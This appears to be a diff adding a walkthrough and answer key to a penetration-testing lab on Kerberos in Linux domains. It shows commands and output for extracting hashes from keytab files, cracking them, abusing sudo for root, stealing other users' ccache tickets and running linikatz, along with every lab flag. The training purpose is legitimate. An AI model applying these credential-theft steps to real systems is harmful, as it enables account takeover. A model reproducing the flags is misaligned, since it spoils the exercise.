@@ -564,14 +564,251 @@ I: [check] KCM Kerberos tickets
 
 ## Questions
 SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.htb" and password "Password2"
-1.  Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory. **Answer: 3**
-2.  Which group can connect to LINUX01? **Answer: 3**
-3.  Look for a keytab file that you have read and write access. Submit the file name as a response. **Answer: 3**
-4.  Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory. **Answer: 3**
+1.  Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory. **Answer: Gett1ng_Acc3$$_to_LINUX01**
+   - `$ ssh 'david@inlanefreight.htb'@10.129.204.23 -p 2222` → SSH to the target
+   - `$ cat flag.txt` → Read the flag
+2.  Which group can connect to LINUX01? **Answer: Linux Admins**
+   - Read permitted-groups:
+        ```sh
+        $ realm list
+        inlanefreight.htb
+          type: kerberos
+          realm-name: INLANEFREIGHT.HTB
+          domain-name: inlanefreight.htb
+          configured: kerberos-member
+          server-software: active-directory
+          client-software: sssd
+          required-package: sssd-tools
+          required-package: sssd
+          required-package: libnss-sss
+          required-package: libpam-sss
+          required-package: adcli
+          required-package: samba-common-bin
+          login-formats: %U@inlanefreight.htb
+          login-policy: allow-permitted-logins
+          permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
+          permitted-groups: Linux Admins
+        ```
+3.  Look for a keytab file that you have read and write access. Submit the file name as a response. **Answer: carlos.keytab**
+   - Look for files contain the `keytab` string with `rw` access provided to others than just the owner (`-rw-rw-rw-`):
+        ```sh
+        $ find / -name *keytab* -ls 2>/dev/null
+        287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
+        288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
+        287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
+        286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
+        131610      4 -rw-------   1 root     root         2694 Mar  3 02:15 /etc/krb5.keytab
+        262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
+        262620      4 -rw-rw-rw-   1 root     root          216 Mar  3 02:25 /opt/specialfiles/carlos.keytab
+        131201      8 -rw-r--r--   1 root     root         4582 Oct  6  2022 /opt/keytabextract.py
+        287958      4 drwx------   2 sssd     sssd         4096 Jun 21  2022 /var/lib/sss/keytabs
+        398204      4 -rw-r--r--   1 root     root          380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri
+        ```
+4.  Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory. **Answer: C@rl0s_1$_H3r3**
+   - Extract the hashes from `/opt/specialfiles/carlos.keytab` to retrieve the NTLM hash (`a738f92b3c08b424ec2d99589a9cce60`):
+        ```sh
+        $ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
+        [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+        [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+        [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+        [+] Keytab File successfully imported.
+                REALM : INLANEFREIGHT.HTB
+                SERVICE PRINCIPAL : carlos/
+                NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
+                AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+                AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
+        ```
+   - Crack the NTLM hash using https://crackstation.net reveals carlos' password: `Password5`
+   - Login as carlos and read the flag:
+        ```sh
+        david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
+        Password: 
+        carlos@inlanefreight.htb@linux01:~$ cat flag.txt
+        C@rl0s_1$_H3r3
+        ```
 5.  Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory. **Answer: 3**
-6.  Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response. **Answer: 3**
-7.  Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio. **Answer: 3**
+   - Find the keytab file:
+        ```sh
+        $ crontab -l
+        # Edit this file to introduce tasks to be run by cron.
+        # 
+        # Each task to run has to be defined through a single line
+        # indicating with different fields when the task will be run
+        # and what command to run for the task
+        # 
+        # To define the time you can provide concrete values for
+        # minute (m), hour (h), day of month (dom), month (mon),
+        # and day of week (dow) or use '*' in these fields (for 'any').
+        # 
+        # Notice that tasks will be started based on the cron's system
+        # daemon's notion of time and timezones.
+        # 
+        # Output of the crontab jobs (including errors) is sent through
+        # email to the user the crontab file belongs to (unless redirected).
+        # 
+        # For example, you can run a backup of all your user accounts
+        # at 5 a.m every week with:
+        # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+        # 
+        # For more information see the manual pages of crontab(5) and cron(8)
+        # 
+        # m h  dom mon dow   command
+        */5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+        carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+        #!/bin/bash
+
+        kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
+        smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
+        ```
+   - But the above keytab file does not have a NTLM hash to crack, try to look at other keytab files located under the same folder:
+        ```sh
+        $ ls /home/carlos@inlanefreight.htb/.scripts/
+        john.keytab  kerberos_script_test.sh  svc_workstations._all.kt  svc_workstations.kt
+        carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
+        [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+        [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+        [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+        [+] Keytab File successfully imported.
+                REALM : INLANEFREIGHT.HTB
+                SERVICE PRINCIPAL : svc_workstations/
+                NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
+                AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
+                AES-128 HASH : 3a7e52143531408f39101187acc80677
+        ```
+   - Crack the NTLM hash using https://crackstation.net reveals svc_workstations' password: `Password4`
+   - Login as svc_workstations and read the flag:
+        ```sh
+        david@inlanefreight.htb@linux01:~$ su - svc_workstations@inlanefreight.htb
+        Password: 
+        svc_workstations@inlanefreight.htb@linux01:~$ cat flag.txt
+        Mor3_4cce$$_m0r3_Pr1v$
+        ```
+6.  Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response. **Answer: Ro0t_Pwn_K3yT4b**
+   - User svc_workstations has root privileges:
+        ```sh
+        svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
+        [sudo] password for svc_workstations@inlanefreight.htb: 
+        Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+        User svc_workstations@inlanefreight.htb may run the following commands on linux01:
+        (ALL) ALL
+        ```
+   - Read the flag:
+        ```sh
+        svc_workstations@inlanefreight.htb@linux01:~$ sudo cat /root/flag.txt
+        Ro0t_Pwn_K3yT4b
+        ```
+7.  Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio. **Answer: JuL1()_SH@re_fl@g**
+   - Check the `/tmp` directory and found 2 Julio's Kerberos tickets:
+        ```sh
+        root@linux01:~# ls -la /tmp
+        total 84
+        drwxrwxrwt 13 root                               root                           4096 Mar  3 03:35 .
+        drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
+        -rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Mar  3 02:58 carlos_ticket
+        drwxrwxrwt  2 root                               root                           4096 Mar  3 02:13 .font-unix
+        drwxrwxrwt  2 root                               root                           4096 Mar  3 02:13 .ICE-unix
+        -rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Mar  3 03:35 krb5cc_647401106_aTo6M1
+        -rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Mar  3 03:35 krb5cc_647401106_HRJDux
+        -rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Mar  3 03:29 krb5cc_647401107_a1bhIa
+        -rw-------  1 john@inlanefreight.htb             domain users@inlanefreight.htb 1395 Mar  3 02:54 krb5cc_647401108_pNfOqw
+        -rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Mar  3 03:32 krb5cc_647401109_i4q8qG
+        -rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Mar  3 03:37 krb5cc_647402606
+        -rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Mar  3 03:11 krb5cc_647402606_91JyEJ
+        drwx------  3 root                               root                           4096 Mar  3 02:13 snap.lxd
+        drwx------  3 root                               root                           4096 Mar  3 02:13 systemd-private-7f92b59e831e431b8b606318d6183117-ModemManager.service-xQamLg
+        drwx------  3 root                               root                           4096 Mar  3 02:13 systemd-private-7f92b59e831e431b8b606318d6183117-systemd-logind.service-b9WgCh
+        drwx------  3 root                               root                           4096 Mar  3 02:13 systemd-private-7f92b59e831e431b8b606318d6183117-systemd-resolved.service-T1CZPi
+        drwx------  3 root                               root                           4096 Mar  3 02:13 systemd-private-7f92b59e831e431b8b606318d6183117-systemd-timesyncd.service-kwLjdi
+        drwxrwxrwt  2 root                               root                           4096 Mar  3 02:13 .Test-unix
+        drwx------  2 root                               root                           4096 Mar  3 02:13 vmware-root_699-3979839557
+        drwxrwxrwt  2 root                               root                           4096 Mar  3 02:13 .X11-unix
+        drwxrwxrwt  2 root                               root                           4096 Mar  3 02:13 .XIM-unix
+        ```
+   - Try to import both to find the ticket that has not expired:
+        ```sh
+        root@linux01:~# cp /tmp/krb5cc_647401106_aTo6M1 .
+        root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_aTo6M1
+        root@linux01:~# klist
+        Ticket cache: FILE:/root/krb5cc_647401106_aTo6M1
+        Default principal: julio@INLANEFREIGHT.HTB
+
+        Valid starting       Expires              Service principal
+        03/03/2026 03:36:03  03/03/2026 13:36:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+                renew until 03/04/2026 03:36:03
+        ```
+   - Read the content of julio.txt:
+        ```sh
+        root@linux01:~# smbclient //DC01/julio -k -c ls --no-pass
+                .                                   D        0  Thu Jul 14 12:25:24 2022
+                ..                                  D        0  Thu Jul 14 12:25:24 2022
+                julio.txt                           A       17  Thu Jul 14 21:18:12 2022
+
+                                7706623 blocks of size 4096. 4459144 blocks available
+        root@linux01:~# smbclient //DC01/julio -k -c 'more julio.txt' --no-pass
+        ```
 8.  Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_). **Answer: 3**
-9.  Transfer Julio's ccache file from LINUX01 to your attack host. Follow the example to use chisel and proxychains to connect via evil-winrm from your attack host to MS01 and DC01. Mark DONE when finished. **Answer: 3**
-10. From Windows (MS01), export Julio's ticket using Mimikatz or Rubeus. Convert the ticket to ccache and use it from Linux to connect to the C disk. Mark DONE when finished. **Answer: 3**
+   - Use Linikatz to find LINUX01$ Kerberos ticket:
+        ```sh
+        root@linux01:~# /opt/linikatz.sh 
+        _ _       _ _         _
+        | (_)_ __ (_) | ____ _| |_ ____
+        | | | '_ \| | |/ / _` | __|_  /
+        | | | | | | |   < (_| | |_ / /
+        |_|_|_| |_|_|_|\_\__,_|\__/___|
+
+                =[ @timb_machine ]=
+
+        <SNIP>
+
+        I: [sss-check] SSS ticket list
+        Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+        Default principal: LINUX01$@INLANEFREIGHT.HTB
+
+        Valid starting       Expires              Service principal
+        03/03/2026 03:51:03  03/03/2026 13:51:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+                renew until 03/04/2026 03:51:03, Flags: RIA
+
+        <SNIP>
+        ```
+   - Import that ticket to current session and read the flag:
+        ```sh
+        root@linux01:~# cp /var/lib/sss/db/ccache_INLANEFREIGHT.HTB .
+        root@linux01:~# export KRB5CCNAME=ccache_INLANEFREIGHT.HTB 
+        root@linux01:~# klist
+        Ticket cache: FILE:ccache_INLANEFREIGHT.HTB
+        Default principal: LINUX01$@INLANEFREIGHT.HTB
+
+        Valid starting       Expires              Service principal
+        03/03/2026 03:51:03  03/03/2026 13:51:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+                renew until 03/04/2026 03:51:03
+        03/03/2026 03:51:03  03/03/2026 13:51:03  ldap/dc01.inlanefreight.htb@
+                renew until 03/04/2026 03:51:03
+        03/03/2026 03:51:03  03/03/2026 13:51:03  ldap/dc01.inlanefreight.htb@INLANEFREIGHT.HTB
+                renew until 03/04/2026 03:51:03
+        root@linux01:~# smbclient //dc01/linux01 -k -c ls --no-pass
+        .                                   D        0  Wed Oct  5 14:17:02 2022
+        ..                                  D        0  Wed Oct  5 14:17:02 2022
+        flag.txt                            A       52  Wed Oct  5 14:17:02 2022
+
+                        7706623 blocks of size 4096. 4459109 blocks available
+        root@linux01:~# smbclient //dc01/linux01 --no-pass
+        Try "help" to get a list of possible commands.
+        smb: \> ls
+        .                                   D        0  Wed Oct  5 14:17:02 2022
+        ..                                  D        0  Wed Oct  5 14:17:02 2022
+        flag.txt                            A       52  Wed Oct  5 14:17:02 2022
+
+                        7706623 blocks of size 4096. 4459109 blocks available
+        smb: \> get flag.txt
+        getting file \flag.txt of size 52 as flag.txt (25.4 KiloBytes/sec) (average 25.4 KiloBytes/sec)
+        smb: \> exit
+        root@linux01:~# file flag.txt
+        flag.txt: Little-endian UTF-16 Unicode text, with CRLF line terminators
+        root@linux01:~# cat flag.txt
+        ��Us1nG_KeyTab_Like_@_PRO
+        ```
+9.  Transfer Julio's ccache file from LINUX01 to your attack host. Follow the example to use chisel and proxychains to connect via evil-winrm from your attack host to MS01 and DC01. Mark DONE when finished. **Answer: DONE**
+10.  From Windows (MS01), export Julio's ticket using Mimikatz or Rubeus. Convert the ticket to ccache and use it from Linux to connect to the C disk. Mark DONE when finished. **Answer: DONE**
    
